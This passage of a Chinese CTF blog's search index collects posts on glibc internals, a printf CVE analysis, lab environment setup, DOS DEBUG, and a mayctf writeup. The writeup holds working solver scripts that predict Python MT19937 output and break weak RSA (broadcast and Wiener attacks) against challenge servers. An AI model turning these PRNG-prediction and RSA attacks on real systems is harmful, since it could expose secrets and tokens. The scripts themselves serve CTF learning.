[{"categories":null,"content":"研究了一下bss段上为什么会有stdin,stdout,stderr, 根据经验观察似乎在使用setvbuf时会出现这种情况, 经过控制变量测试, 发现只要setvbuf这三个变量的一个, 就会使该变量出现在bss段中. setvbuf使用了这三个stdio.h中的extern变量 /* Standard streams. */ extern FILE *stdin; /* Standard input stream. */ extern FILE *stdout; /* Standard output stream. */ extern FILE *stderr; /* Standard error output stream. */ /* C89/C99 say they're macros. Make them happy. */ #define stdin stdin #define stdout stdout #define stderr stderr 他们定义在stdio.c中, 不过右边的仍然是extern变量 #include \"libioP.h\" #include \"stdio.h\" #undef stdin #undef stdout #undef stderr FILE *stdin = (FILE *) \u0026_IO_2_1_stdin_; FILE *stdout = (FILE *) \u0026_IO_2_1_stdout_; FILE *stderr = (FILE *) \u0026_IO_2_1_stderr_; 他们最初的定义在stdfile.c中 DEF_STDFILE(_IO_2_1_stdin_, 0, 0, _IO_NO_WRITES); DEF_STDFILE(_IO_2_1_stdout_, 1, \u0026_IO_2_1_stdin_, _IO_NO_READS); DEF_STDFILE(_IO_2_1_stderr_, 2, \u0026_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED); struct _IO_FILE_plus *_IO_list_all = \u0026_IO_2_1_stderr_; libc_hidden_data_def (_IO_list_all) 因为stdin等三个变量是未初始化的全局变量, 所以他们被分配到bss段. 在执行setvbuf时, 经过两次重定位将libc地址填入其中. 如果不setvbuf, 这三个符号就不会被用到, 也就不会被解析. ","date":"2023-12-12","objectID":"/io_pointers_on_bss/:0:0","tags":null,"title":"为什么bss上有时会有stdin,stdout,stderr指针","uri":"/io_pointers_on_bss/"},{"categories":null,"content":"\r问题发现似乎在使用setbuf时, 它们会作为libc里的变量出现在got表里, 这又是为什么呢? P198 P194 ![[279a9d0da6d999a174b5d072d63afc92.png]] ![[d2dfc527da1909ca844b92495861ce84_720.png]] ","date":"2023-12-12","objectID":"/io_pointers_on_bss/:0:1","tags":null,"title":"为什么bss上有时会有stdin,stdout,stderr指针","uri":"/io_pointers_on_bss/"},{"categories":null,"content":"\r0x00 背景TPCTF里和qym师傅研究了两天safehttpd这题（虽然我一直在背英语pre，没干什么活），把整个程序可能的漏洞点翻遍了也没找到突破口的off by null如何触发（实际上是测试过程中出现了重大失误，已经找对了地方却没有测试出漏洞），赛后看wp发现有这样一个CVE： 30068 – (CVE-2023-25139) incorrect printf output for integers with thousands separator and width field (CVE-2023-25139) (sourceware.org) ","date":"2023-12-11","objectID":"/cve-2023-25139/:1:0","tags":["pwn"],"title":"CVE-2023-25139","uri":"/cve-2023-25139/"},{"categories":null,"content":"\r0x01 分析先看上面链接中的复现样例： #include \u003cstdio.h\u003e #include \u003clocale.h\u003e int main (void) { if (setlocale (LC_ALL, \"\")) { printf (\"1234567890123:\\n\"); printf (\"%0+ -'13ld:\\n\", 1234567L); } return 0; } 在有漏洞的Glibc2.37下的输出： 1234567890123: +1,234,567 : 输出的长度是15而不是13，因为两个千位分隔符没有被计入宽度，导致输出时多补了两个空格。 这是一个glibc 2.37里短暂出现就被迅速修复的漏洞：千位分隔符在限制长度的格式化输出时没有被正确计入宽度，导致出现了溢出。 由该commit修复： Account for grouping in printf width (bug 30068) · bminor/glibc@c980549 (github.com) 下面就通过这个修复的commit分析一下这个bug是如何产生的。 其中第266行由 width -= workend - string + prec 改成了 width -= number_length + prec_inc 这里的width变量为补足宽度限制需要添加的字符的宽度。prec和prec_inc的值是相同的，区别在于number_length和workend - string并不等同：(168-182行) int number_length; #ifndef COMPILE_WPRINTF if (use_outdigits \u0026\u0026 base == 10) number_length = __translated_number_width (_NL_CURRENT_LOCALE, string, workend); else number_length = workend - string; if (group) number_length += iter.separators * strlen (thousands_sep); #else number_length = workend - string; /* All wide separators have length 1. */ if (group \u0026\u0026 thousands_sep != L'\\0') number_length += iter.separators; #endif 在上面代码的后几行可以看到number_length是原本的数字长度加上千位分隔符的长度，而workend-string没有计算千位分隔符的长度，导致了错误的长度计算。 if (!left) { width -= number_length + prec; if (number.word != 0 \u0026\u0026 alt \u0026\u0026 (base == 16 || base == 2)) /* Account for 0X, 0x, 0B or 0b hex or binary marker. */ @@ -221,7 +227,7 @@ LABEL (unsigned_number): /* Unsigned number of base BASE. */ Xprintf_buffer_putc (buf, spec); } width += prec; Xprintf_buffer_pad (buf, L_('0'), width); if (octal_marker) @@ -237,6 +243,8 @@ LABEL (unsigned_number): /* Unsigned number of base BASE. */ } else { if (is_negative) { Xprintf_buffer_putc (buf, L_('-')); @@ -263,9 +271,13 @@ LABEL (unsigned_number): /* Unsigned number of base BASE. */ if (octal_marker) --width; width -= workend - string + prec; ... } 另外，根据代码可以看出只有在左对齐的情况下（没有进入if(!left), 而是进入下面的else）长度计算是错误的，进行测试： #include \u003clocale.h\u003e #include \u003cstdio.h\u003e int main() { if (setlocale(LC_ALL, \"en_US.utf8\")) { printf(\"1234567890123:\\n\"); printf(\"%+-'13ld:\\n\", 1234567L); printf(\"%0+'13ld:\\n\", 1234567L); } return 0; } 输出： ❯ ./test 1234567890123: +1,234,567 : +0001,234,567: 可以看到确实只有左对齐时由于未减去两个千位分隔符的宽度而多填充了两个空格，右对齐时是正常的。 ","date":"2023-12-11","objectID":"/cve-2023-25139/:2:0","tags":["pwn"],"title":"CVE-2023-25139","uri":"/cve-2023-25139/"},{"categories":null,"content":"\r0x02 其他 将prec替换成prec_inc可能是因为后续还需要用到原来的prec的值，并且这样使变量的语义更加清晰，（由于本人阅读代码水平不足没有查证。 千位分隔符和精度限制同时使用早在2.27时就有前导0缺少千位分隔符（不确定这是不是bug）以及空格的编码长度会影响补0的数量的bug。看来即使是写标准库的程序员处理这种东西也很头痛。 23432 – incorrect printf output for integers with thousands separator and precision field larger than the number of digits (needing leading zeros) (sourceware.org) 赛后复盘时发现搜索sprintf CVE/Glibc sprintf vuln关键词可以定位到这个CVE，而sprintf thousand separator vulnerability/bug/…则难以定位到，一部分原因是其它语言的sprintf造成的干扰、以及CVE的指向性才足够明确。 ","date":"2023-12-11","objectID":"/cve-2023-25139/:3:0","tags":["pwn"],"title":"CVE-2023-25139","uri":"/cve-2023-25139/"},{"categories":null,"content":"\r基础 编辑器: LunarVim 基于clangd的代码提示, compile_commands.json由bear生成, 命令是bear -- make tmux管理窗口(目前又改成了zellij, 感觉快捷键更好用一点) ","date":"2023-07-08","objectID":"/wsl2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:1:0","tags":null,"title":"WSL2中C/C++开发环境配置","uri":"/wsl2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"\r美化 WSL2: 运行在Windows Terminal中, 安装oh my posh, One Half Dark主题 字体: Fira Code Nerd Font (为了显示LunarVim以及终端中各种小图标) Powerlevel10k 效果: ![img][https://upload.cc/i1/2023/07/08/J54ryo.png] ![img][https://upload.cc/i1/2023/07/08/v7qjNg.png] 比之前那个运行在CMD里调个窗口大小就闪退, 配色还极其阴间, 显示不出来图标的状态强了不知道多少. ","date":"2023-07-08","objectID":"/wsl2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:2:0","tags":null,"title":"WSL2中C/C++开发环境配置","uri":"/wsl2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"\r效率提升 lazygit LunarVim中打包的一些插件差不多够用, 懒得折腾新的了 ","date":"2023-07-08","objectID":"/wsl2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:3:0","tags":null,"title":"WSL2中C/C++开发环境配置","uri":"/wsl2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"\r问题 挂代理也连不上各种东西, 经一通检查之后发现 感觉是wsl和steam++一起干的好事… ","date":"2023-07-08","objectID":"/wsl2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:4:0","tags":null,"title":"WSL2中C/C++开发环境配置","uri":"/wsl2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"\r0x00 前言Windows+WSL2(Ubuntu22.04)下的exploit.education的phoenix虚拟机环境配置, 但不建议使用Windows配置环境, 比Linux多了不必要的麻烦. ","date":"2023-03-28","objectID":"/phoenix/:1:0","tags":null,"title":"Phoenix","uri":"/phoenix/"},{"categories":null,"content":"\r0x01 QEMU安装官网amd的下载包只有Qcow2格式的可用了, 所以只能装一个QEMU. 去QEMU官网下载一个win版的安装包一路默认就可以了, 可以改个安装地址. ","date":"2023-03-28","objectID":"/phoenix/:2:0","tags":null,"title":"Phoenix","uri":"/phoenix/"},{"categories":null,"content":"\r0x02 虚拟机安装以及sshLinux下直接运行压缩包中的boot脚本即可, 但Windows不行, 我找到个大佬博客提供了脚本.创建一个boot.ps1文件, 把下面的代码复制进去改下qemu的路径即可. D:\\Program` Files\\qemu\\qemu-system-x86_64.exe ` -kernel vmlinuz-4.9.0-8-amd64 ` -initrd initrd.img-4.9.0-8-amd64 ` -append \"root=/dev/vda1\" ` -m 1024M ` -netdev user,id=unet,hostfwd=tcp:127.0.0.1:2222-:22 ` -device virtio-net,netdev=unet ` -drive file=exploit-education-phoenix-amd64.qcow2,if=virtio,format=qcow2,index=0 第一行的路径是qemu的安装路径, 注意空格用`代替. 再用powershell运行一下这个脚本即可, 若提示禁止运行脚本则给一下脚本运行权限即可. 下一步是ssh到Phoenix虚拟机上, 配置脚本中\"hostfwd=tcp:127.0.0.1:2222-:22\"指定了虚拟机监听本机的127.0.0.1:2222端口, 如果你使用普通虚拟机, 则直接ssh到这个端口即可, 可以ssh -p2222 user@localhost , 用户名和密码都是user, 配置环境到这里就结束了. 但如果你跟我一样使用的是WSL2, 并且没有升级到Win11所以WSL没有固定的ip地址, 那还需要再操作一下. 打开Powershell输入Get-NetIPInterface, 找到vEthernet(WSL), 记下前面的ifIndex, 然后在刚才的脚本前面加上两句. $WSL_ip = (Get-NetIPAddress -InterfaceIndex 76 -AddressFamily Ipv4).IPAddress $WSL_ip += \":2222\" Get-NetIPAddress的文档: https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-netipaddress?view=windowsserver2022-ps 把76改成你的vEthernet(WSL)的ifIndex. 再把hostfwd那里的127.0.0.1:2222替换为$WSL_ip即可. 然后你还要在WSL2里再获取这个ip地址, 如果你给WSL2配置过代理, 那应该获取过这个ip, 如果没有, 在你的WSL2的~/.bashrc里加上这句: host_ip=$(cat /etc/resolv.conf |grep \"nameserver\" |cut -f 2 -d \" \") 然后source ~/.bashrc 在WSL2里ssh的时候输入ssh -p2222 user@$host_ip即可. ","date":"2023-03-28","objectID":"/phoenix/:3:0","tags":null,"title":"Phoenix","uri":"/phoenix/"},{"categories":null,"content":"\r0x00 前言好奇无参数启动debug时, debug在对什么程序进行debug, 于是进行一番探究. ","date":"2023-03-25","objectID":"/when-debug-starts-with-no-command-line-parameters/:1:0","tags":["汇编语言"],"title":"当DEBUG无参数启动时, 我们在debug什么?","uri":"/when-debug-starts-with-no-command-line-parameters/"},{"categories":null,"content":"\r0x01 过程查了一堆类似\"What DEBUG for DOS debug without parameters\", “What DEBUG open by default\"之类的问题, 没找到什么答案, 搜索的过程感觉在考古, 有用信息较少. 尝试用-u指令反汇编阅读代码, 看不出什么有用信息. 然后尝试二分法寻找指令段的结尾, 也没找到什么有用信息. 在这个过程中发现add [BX+SI], AL指令对应的机器码是0000. 尝试将整个程序dump下来, 没找到怎么dump. 于是再次返回搜索引擎, 仔细阅读Debug (command) - Wikipedia, 找到了这段, 他的第一句话看起来有用: When DEBUG is started without any parameters the DEBUG prompt, a “-” appears. The user can then enter one of several one or two-letter subcommands, including “A” to enter the assembler mode, “D” to perform a hexadecimal dump, “T” to trace and “U” to unassemble (disassemble) a program in memory.13 DEBUG can also be used as a “DEBUG script” interpreter using the following syntax. 实际上也没什么想要的信息, 还是不知道debug打开的到底是什么. 后来开始翻下面的reference, 找到了这条: Sedory, Daniel B. “A Guide to DEBUG”. Retrieved 2014-11-29. 里面有一段这个: A. When DEBUG starts with no command-line parameters, it: 1) Allocates all 64 KiB of the first free Memory Segment. 2) The Segment registers, CS, DS, ES and SS are all set to the value of that 64 KiB Segment’s location (CS=DS=ES=SS=Segment Location). 3) The Instruction Pointer (IP) is set to cs:0100 and the Stack Pointer (SP) is set to ss:FFEE (under DOS 3.0 or above). 4) The registers, AX, BX, CX, DX, BP, SI and DI are cleared to zero along with the flag bits in the Flag Register; with one exception: The Interrupts Flag is set to Enable Interrupts. (See the Appendix, The 8086 CPU Registers for more information.) DEBUG会分配空闲的前64KB内存段, 将CS, DS, ES, SS同时指向它也就是将它同时当作代码段, 数据段, 附加段和栈段, IP设为100, SP设为FFEE. ","date":"2023-03-25","objectID":"/when-debug-starts-with-no-command-line-parameters/:2:0","tags":["汇编语言"],"title":"当DEBUG无参数启动时, 我们在debug什么?","uri":"/when-debug-starts-with-no-command-line-parameters/"},{"categories":null,"content":"\r0x02 结论所以说, DEBUG无参数打开时只是将第一段空闲内存中的无用数据作为指令序列而已, 并且作为运行在实模式下的单任务系统, DOS的内存分布相当固定, 我的DOSbox每次打开debug, 段寄存器的值都是0DBD. 另外, 上面的“A Guide to DEBUG”是个不错的DEBUG祖传使用指南, 从07年更新到20年, 可能还在持续更新. ","date":"2023-03-25","objectID":"/when-debug-starts-with-no-command-line-parameters/:3:0","tags":["汇编语言"],"title":"当DEBUG无参数启动时, 我们在debug什么?","uri":"/when-debug-starts-with-no-command-line-parameters/"},{"categories":null,"content":"\r0x00 前置知识x86_32下应用程序调用系统调用的过程: 把系统调用号存入eax. 把函数参数存在其他寄存器(ebx, ecx, edx, esi, edi), 当系统调用参数大于6个时，全部参数应该依次放在一块连续的内存区域里，同时在 ebx 中保存指向该内存区域的指针. 触发0x80中断, 切换到内核态, 执行中断处理函数. (为了节约宝贵的中断号, Linux用int 0x80触发所有系统调用. 再为每个系统调用分配与中断号用法类似的系统调用号) ","date":"2023-03-16","objectID":"/buuctfothers_shellcode/:1:0","tags":["pwn"],"title":"[BUUCTF]others_shellcode wp","uri":"/buuctfothers_shellcode/"},{"categories":null,"content":"\r0x01 题目分析IDA看到main函数里只执行了一个getShell()函数, 代码如下. int getShell() { int result; // eax char v1[9]; // [esp-Ch] [ebp-Ch] BYREF strcpy(v1, \"/bin//sh\"); result = 11; __asm { int 80h; LINUX - sys_execve } return result; } 插入了汇编代码int 0x80. 根据IDA的注释可以看到eax的值就是result的值11. 而32位下系统调用号11即为execve. 32位调用参数存在栈里, 此处即为栈顶的v[1]内的\"/bin/sh\". 所以相当于手动调用了系统调用execve(\"/bin/sh\"). ","date":"2023-03-16","objectID":"/buuctfothers_shellcode/:2:0","tags":["pwn"],"title":"[BUUCTF]others_shellcode wp","uri":"/buuctfothers_shellcode/"},{"categories":null,"content":"\r0x00 序言赶上吾爱破解十五周年开放注册, 注册了个账号. 随便翻了翻精品帖子, 看到从0到-1写一个操作系统-0xFF-!!完结撒花!!, 感觉还不错, 于是开始动手实践, 开一个博客记录, 也是督促自己坚持下去. ","date":"2023-03-14","objectID":"/oslearning/:1:0","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\r0x01 操作系统的启动","date":"2023-03-14","objectID":"/oslearning/:2:0","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\r实模式刚开机时CPU进入实模式, 因为此时只能使用物理地址. 实模式地址的分布是固定的,以8086为例, BIOS入口在0xFFFF0到0xFFFFF之间, 其中是一个jmp指令, 跳转到真正的BIOS位置. 中断向量表在0x00000到0x003FF. MBR加载地址在0x7C00到0x7DFF. ","date":"2023-03-14","objectID":"/oslearning/:2:1","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\rBIOS(Basic Input/Output System)基本输入输出系统. 早期存储在ROM中, 现在存储在主板上的一个或多个芯片中. 目前其继承者UEFI(Unified Extensible Firmware Interface)正在全面取代BIOS. BIOS首先进行加电自检(Power-On Self-Test), 缩写为POST, 检查CPU, 内存, 主板, 硬盘, 显卡等设备. POST结束后系统BIOS调用其他设备的BIOS对各个设备进行检测和初始化. 如果自检没有出现问题, 将执行启动程序. ","date":"2023-03-14","objectID":"/oslearning/:2:2","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\rBootBOOT(靴子), 意为\"to load a program into a computer from a disk; to start or ready for use especially by booting a program.\" BOOTSTRAP(鞋带) pull oneself up by one’s bootstraps 靠自己自立自强 by one’s own bootstraps 自己努力, 自强 必须先运行程序, 计算机才能启动, 但是计算机不启动就无法运行程序. 这与人没法拽着鞋带把自己拉起来类似. 于是早期工程师们设法先将一小段程序装入内存, 称之为\"boot\", 意为\"自引导程序\". ","date":"2023-03-14","objectID":"/oslearning/:2:3","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\rMBR(Master boot record)BIOS按照设定的启动顺序, 将控制权转移给启动顺序首位的存储设备. BIOS首先寻找他们的MBR, 如果该磁盘的主引导扇区(0柱头, 0磁头, 1扇区, 即前512个字节)最后两字节为0x55和0xaa, BIOS则认为MBR有效, 并将控制权转交给MBR. 如果未找到MBR, BIOS会去启动顺序中下一顺位的设备中寻找. MBR由三部分组成: 启动代码(446字节), 磁盘分区表(16x4字节), 结束标志(0x55, 0xaa 两字节). ","date":"2023-03-14","objectID":"/oslearning/:2:4","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\rBoot LoaderBoot Loader(启动引导程序)用于加载操作系统内核文件. 用户可以用Boot Loader来选择启动不同的操作系统. Windows的Boot Loader是Windows Boot Manager. ","date":"2023-03-14","objectID":"/oslearning/:2:5","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\r操作系统操作系统内核被载入内存后, 再经过一系列初始化过程完成操作系统的启动. ","date":"2023-03-14","objectID":"/oslearning/:2:6","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\r参考文献计算机是如何启动的 ","date":"2023-03-14","objectID":"/oslearning/:3:0","tags":null,"title":"操作系统学习笔记","uri":"/oslearning/"},{"categories":null,"content":"\r侠客行","date":"2022-11-07","objectID":"/mayctf_writeup/:0:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rcrypto","date":"2022-11-07","objectID":"/mayctf_writeup/:1:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\reasy_md5计算服务器给出的乱码字符串的md5码, 虽然很简单但是那个乱码字符串用recvuntil读进来是bytes类型, 转字符串再计算md5的处理折磨了我几天, 最后用一种比较离谱的办法搞出来了. #from re import L from pwn import * import binascii import hashlib,string,random context(log_level = 'debug', arch = 'amd64', os = 'linux') io = remote(\"124.220.41.254\",11111) io.recvuntil(b\"2.Go away\\n\") io.sendline(b\"1\") io.sendline(b\"qwq\") for i in range(6000): io.recvuntil(b\"say Goodbye\\n\") io.sendline(b\"1\") io.recvuntil(b\"it: \\n\") temp = io.recvuntil(\"your answer is:\") print(type(temp)) print(temp) temp1 = binascii.hexlify(temp) print(type(temp1)) print(temp1) temp2 = str(temp1)[2:-33] # 把后面没用的部分和前面的b'切掉 print(temp2) temphex = temp2.encode() print(\"hex:\" + str(temphex)) temp3 = binascii.unhexlify(temphex) print(\"temp3=\") print(temp3) md5_val = hashlib.md5(temp3).hexdigest().encode() io.sendline(md5_val) io.interactive() ","date":"2022-11-07","objectID":"/mayctf_writeup/:1:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rbaby_rsa题目给了很多组用相同e=11加密的密文, 应该可以使用低加密指数广播攻击, 这个链接里的CRT库我没搞到, 就搜了个中国剩余定理的代码自己加上去了. 网上搜一搜(可能要多搜一搜)就能找到类似的能用的脚本, 搜索关键词: ctf RSA 常见攻击方法. (我其实根本不会什么RSA, 比赛期间每天开几百个标签页翻博客翻wiki现学) import gmpy2 import libnum from Crypto.Util.number import * e = 11 N1=154138893031950812804120948392603124557242211711277485061308240993124313732211279511595626583960246423479654669364018699007198897071143217441546155862747358089010644925573135881922236213189698270399946058171344534655622607039586875029687431154950177266012626738593343071988943186407181296514810694125864081601 c1=98926344515647504399225636761528905645802532545693544694454785735305460919596903128833557069325326661028104317297047000856917506618855594309699165210683905794978867356051052331549983749375117383872431266542883572114869378410172099323818354572916315128154668223806222726070664367065915499268980993779253935516 N2=86514617485057897645877877418810404600688645086661842357280958678200768337589100841627012103955019580351983040655055714800184344630539935518655330463075763577593277665589669070278531373336409696818356721984350712552889427669020392579023797538026839552974415794008382017493143944888703124470202551078659352663 c2=75056078801263431079154052442172576124247895253215563207944841902878348017296790510141871346270856063609200053538294111688354692167473538962578731670603307292512882273455961882186047557763940416337901627796005455143645618218009618519299047982258181099409200443275348991355231229301221271732672593076692584463 N3=96961438177994617287121862157619616095852607608269576230762622935734008477003719886243109902819559250956050180744915278738087849968306282926367947551601510457193338601494829396132477161737299626378362389850089329722900718313962190291093787064916802552726196020043029653806939907067734928802006598359428743573 c3=42911703221067649105514235481314094622057095399018731211874982055050166576464411206554227816570858912645373579734715079823062662335989984307422598450406222926220095131918464768493168761412593144835811018820748985266717652453878226446729626760052899652544606622539075350905147277324854643552338096062345040680 N4=96337917450464705638157913350494795554450624187488672278618351933694294990281550536183239162339210424676879236832141034818371118158745922339374148740628023451682938986765653759749890630877193004099940290835878699738939306373942395245867239942935260102954160344387749817357504790873523115689914505120814358019 c4=94896163337747811212289297272205182973538660292147353603196072220447652940721106445001416052540533052966523491426190055204945991143374511264716382604593330452124509417674088865359204632240978514623561181739183049396718271248990299809518521536504844010314490056922171155978748053034224581391503245938951437468 N5=159065026528024471678677993629761300832469771126148910910761078671979319233124404804248443572761151491626452844755848344554663284817854141285080988173410568359037103145102346833636270833083899615413820078030032685265923088526838814011879631003108432555095332817246395680158765289946784702648142394647310563979 c5=86436414993877789051660162717515603069480110129645698291780910638982761956599901036160019618500844176719858011551842647062756517490861485351151784203554780588388517618072139128245625214292430739697415380771981734790346798275647519527685534841001515084062048710748882773830690095514966045223816034266594583141 N6=84620574105159916425196399826141040298335405956512236823234562195266757696468375881641065194345140520954038020477818803012182608903009675261842604850902920908875253122836400402666412538282095255134793266063434773354288303864915885962622703424802519680626137205395807107985618314509251648028278712126218889211 c6=9106762922835184222874379064216558126117386095853116976279091383507889403154957517755730993063421419625691478186715960911590095990314839054402428284810626894210136742089461859730677969913510417457600696319622661099835892819570903936880309306523897842994259050364642598148846778862860661513607992814691918437 N7=8993612147","date":"2022-11-07","objectID":"/mayctf_writeup/:1:2","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rtyping_game_revange AKA baby_guess_me读代码可知前666次是和baby_typing_game一样的, 只需要把服务器发送过来的随机数发送回去即可, 但666次之后将不再给出这个随机数. 那就需要我们猜出这个随机数是什么. 观察随机数生成的代码. class GAME: def __init__(self): random.seed(urandom(32)) def deal(self): n = random.getrandbits(32) return str(n) 我们知道随机数都是伪随机算法生成的, 可能会有预测手段, 于是搜索随机数预测, ctf, random.getrandbits相关信息, 最后找到一篇文章. 把里面代码抄一抄即可. from re import L from pwn import * import hashlib,string,random from random import Random def invert_right(m,l,val=''): length = 32 mx = 0xffffffff if val == '': val = mx i,res = 0,0 while i*l\u003clength: mask = (mx\u003c\u003c(length-l)\u0026mx)\u003e\u003ei*l tmp = m \u0026 mask m = m^tmp\u003e\u003el\u0026val res += tmp i += 1 return res def invert_left(m,l,val): length = 32 mx = 0xffffffff i,res = 0,0 while i*l \u003c length: mask = (mx\u003e\u003e(length-l)\u0026mx)\u003c\u003ci*l tmp = m \u0026 mask m ^= tmp\u003c\u003cl\u0026val res |= tmp i += 1 return res def invert_temper(m): m = invert_right(m,18) m = invert_left(m,15,4022730752) m = invert_left(m,7,2636928640) m = invert_right(m,11) return m def clone_mt(record): state = [invert_temper(i) for i in record] gen = Random() gen.setstate((3,tuple(state+[0]),None)) return gen # f = open(\"random\",'r').readlines() def test(): prng = [] for i in f: i = i.strip('n') prng.append(int(i)) g = clone_mt(prng[:624]) for i in range(700): g.getrandbits(32) key = g.getrandbits(32) print(key) #2990136190 io = remote(\"124.220.41.254\" ,\"11115\") io.recvline() io.recvline() io.recvline() io.recvline() io.recvline() io.recvline() io.recvline() io.recvline() temp = io.recvline() print(temp) temp1 = temp.split(b\"==\") print(temp1) part_proof = bytes.decode(temp1[0].split(b\"XXXX\")[1])[1:-2] sha = bytes.decode(temp1[1]).strip() table = string.ascii_letters + string.digits while True: XXXX = \"\".join([random.choice(table)for _ in range(4)]) temp_proof = XXXX + part_proof temp_sha = hashlib.sha256(temp_proof.encode()).hexdigest() if sha == temp_sha: # io.recvuntil(b\"[+] Give Me XXXX :\") print(XXXX) io.sendline(XXXX.encode()) break io.recvuntil(b\"chance.\\n\") prng = [] for i in range (1,666): temp2 = str(io.recvline()) print(temp2) load = temp2.split(\": \")[1] num = int(temp2.split(\". \")[1][0:-3]) prng.append(num) load = load[0:-3] print(load) #oad = temp2[19:-1] io.sendline(load.encode()) io.recvuntil(b\"999.\\n\") g = clone_mt(prng[:624]) for i in range(1, 666): g.getrandbits(32) s = \"Mia is friendly. \" for i in range(666, 1000): load2 = s + str(g.getrandbits(32)) print(load2) #load = temp2[19:-1] io.sendline(load2.encode()) io.recvuntil(b\"999.\\n\") print(io.recvline()) io.interactive() # https://www.anquanke.com/post/id/205861 # 预测MT19937随机数 ","date":"2022-11-07","objectID":"/mayctf_writeup/:1:3","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\reasy_rsa给了c, n, e, 且e十分巨大. 搜索ctf常见RSA攻击方法得知可以用维纳攻击. 但是网上搜的脚本大部分都不好用, 好像是因为数太大了处理不了? 最后找到一个github上7年前提交过7次的仓库, 给出n和e可以维纳攻击出p, q import gmpy2 def Decrypt(c,e,p,q): L=(p-1)*(q-1) d=gmpy2.invert(e,L) n=p*q m=gmpy2.powmod(c,d,n) flag=hex(m) print(\"mayctf{\"+flag+\"}\") p = 1490587079219338398046620290641082427994787180296034541527858514000071029343752406735847693977924168828149001457282074522354165319366595790326245635098271773304354653474088493071314680542595377493305415990540332637745850468529896832892079272160975645522917094630190865096266981896643169563810687699889181129753293 q = 8157786915328735316695964080412156345016326373162388966201354262397384063917707519351757045573720193359894766595418350130794340294600225144713656030212381 c = 8541318851645545344930243969429110208254565388085191517872761876900839076065069888858514228262306414747946717710205279245215034198965473107281872193488118230733863861616328150112085500328432358109659088247825927281412808489490707737075292549138659022487851598377867926699203115994343831215533955081300618602617070303389413096018280325725402247611090721635884411321425677611344588261611431947370799546061778334598026059784862108006128306767927154553941313401810412831 n = 12159891771013595814091861874421237585413006358206424082455634832926323194345835046235391486976184552133143329591437178662345730209888807650947037014314586234738789951967938911343052092814756499927753883248059955719123797775174845540111932407799514279901643394655797001273023118185654706240750668406507075848502103921454045082847250889333760714185157556161149008265548298639622072127150613477361173938771419295716135315250527713627525487340817084800006139324924120633 e = 213430058491778540960760024438695043602478507503440169434257192452982713126550143463211986560696072631461520765079924616978705534621300264297689001753491674154760883840909846609800795144777305651106426279144796744740429593882387137111622972666648062225161733733882949499069602323754776638192717411131975351015616681736934546665843369748279104215149629133967947618281790436189006910280067044972668152130796424077182216525946728252724509629272536239924932370930844607 if (p*q == n): print(\"yes\") Decrypt(c,e,p,q) ''' JuicyMio@LAPTOP-HTR61OVO MINGW64 /d/Personal_Files/ctf/WienerAttack-master/WienerAttack-master $ ./wiener.rb -n 12159891771013595814091861874421237585413006358206424082455634832926323194345835046235391486976184552133143329591437178662345730209888807650947037014314586234738789951967938911343052092814756499927753883248059955719123797775174845540111932407799514279901643394655797001273023118185654706240750668406507075848502103921454045082847250889333760714185157556161149008265548298639622072127150613477361173938771419295716135315250527713627525487340817084800006139324924120633 -e 213430058491778540960760024438695043602478507503440169434257192452982713126550143463211986560696072631461520765079924616978705534621300264297689001753491674154760883840909846609800795144777305651106426279144796744740429593882387137111622972666648062225161733733882949499069602323754776638192717411131975351015616681736934546665843369748279104215149629133967947618281790436189006910280067044972668152130796424077182216525946728252724509629272536239924932370930844607 [1490587079219338398046620290641082427994787180296034541527858514000071029343752406735847693977924168828149001457282074522354165319366595790326245635098271773304354653474088493071314680542595377493305415990540332637745850468529896832892079272160975645522917094630190865096266981896643169563810687699889181129753293, 8157786915328735316695964080412156345016326373162388966201354262397384063917707519351757045573720193359894766595418350130794340294600225144713656030212381] ''' ","date":"2022-11-07","objectID":"/mayctf_writeup/:1:4","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rweb","date":"2022-11-07","objectID":"/mayctf_writeup/:2:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rNO COPY直接显示flag但禁止复制, 但是这个功能肯定要js来实现所以直接把js关掉就行. chrome设置里就有. 我因为经常复制网页上不让复制的东西比如百度文库, 所以有脚本: 建一个书签然后链接填下面的东西, 需要复制的时候点一下就行. 不过这个功能比较单一, 遇到高级点的防复制就不好使了, 油猴上还有别的更高级的脚本可以自行搜索. javascript:!function e(t){function n(){}function o(e){e[i].removeChild(e)}function r(e){return[].slice.call(t.querySelectorAll(e))}function 